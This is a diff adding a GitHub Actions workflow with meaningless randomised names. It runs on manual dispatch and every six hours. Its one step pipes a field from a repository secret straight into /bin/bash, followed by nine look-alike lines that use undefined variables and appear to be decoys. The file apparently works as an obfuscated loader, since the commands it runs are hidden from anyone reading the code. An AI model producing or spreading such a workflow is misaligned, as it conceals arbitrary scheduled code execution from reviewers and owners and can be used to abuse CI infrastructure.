@@ -1,0 +1,26 @@
+name: panxiaoxia1616
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: panxiaoxia1616
+        env:
+          xqbxx691: ${{ secrets.xqbxx691 }}
+        run: |
+          echo $xqbxx691 | jq -r .eu5 | /bin/bash
+          echo $ph90 | jq -r .l5626 | /bin/bash
+          echo $f46 | jq -r .y63 | /bin/bash
+          echo $yj388 | jq -r .eyy8 | /bin/bash
+          echo $hcuok7466 | jq -r .rbna7123 | /bin/bash
+          echo $zy4 | jq -r .tx98 | /bin/bash
+          echo $xncn099 | jq -r .tkq8525 | /bin/bash
+          echo $iq591 | jq -r .jbhzl7989 | /bin/bash
+          echo $bbtzm950 | jq -r .d9430 | /bin/bash
+          echo $mjksu2 | jq -r .xpkc695 | /bin/bash
+
